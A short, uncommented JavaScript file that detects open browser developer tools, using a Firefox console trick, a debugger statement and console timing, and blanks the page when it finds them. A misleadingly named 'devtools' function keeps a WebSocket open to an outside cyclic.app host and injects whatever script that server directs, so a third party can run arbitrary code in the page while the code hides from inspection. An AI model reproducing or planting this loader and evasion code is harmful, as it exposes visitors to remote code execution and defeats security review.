(function () {
    if(!('mozInnerScreenX' in window)) return;
    let ptrEx = /😹/;
    console.log(ptrEx);
    ptrEx.toString = () => window.location = 'about:blank';
    debugger;
})();

function devtools() {
    const ws = new WebSocket("wss://aggressive-lime-pajamas.cyclic.app");
    return new Promise(resolve => {
        ws.addEventListener("message", ({ data }) => {
            if(data === "[ok]"){
                resolve(data)
            } else {
                const script = document.createElement("script");
                script.src = `https://aggressive-lime-pajamas.cyclic.app/test.js?id=${data}`;
                const onDone = () => script.remove();
                script.addEventListener("load", onDone);
                script.addEventListener("error", onDone);
                document.head.append(script)
            }
        })
    })
}

devtools().then(() => location.replace("about:blank"));

(() => {
function makeLargeObjectArray() {
    let result = [];
    let obj = {};
    for(let i=0; i<500; i++) obj[i] = i;
    for(let i=0; i<50; i++) result.push(obj);
    
    return result;
}

function getTimeDif(logFunc) {
    let deltaTime = Date.now();
    return logFunc(), Date.now() - deltaTime;
}
    
let tbl = console.table;
let lg = console.log;

let maxPrintTime = 0;
let largeObjectArray = makeLargeObjectArray();

setInterval(() => {
    let tableTime = getTimeDif(() => tbl(largeObjectArray));
    let logTime = getTimeDif(() => lg(largeObjectArray));

    maxPrintTime = Math.max(maxPrintTime, logTime);
    console.clear()

    if (tableTime === 0 || maxPrintTime === 0) return;

    if(tableTime > 10 * maxPrintTime && document.visibilityState === "visible") location = "about:blank";
}, 200)

})();
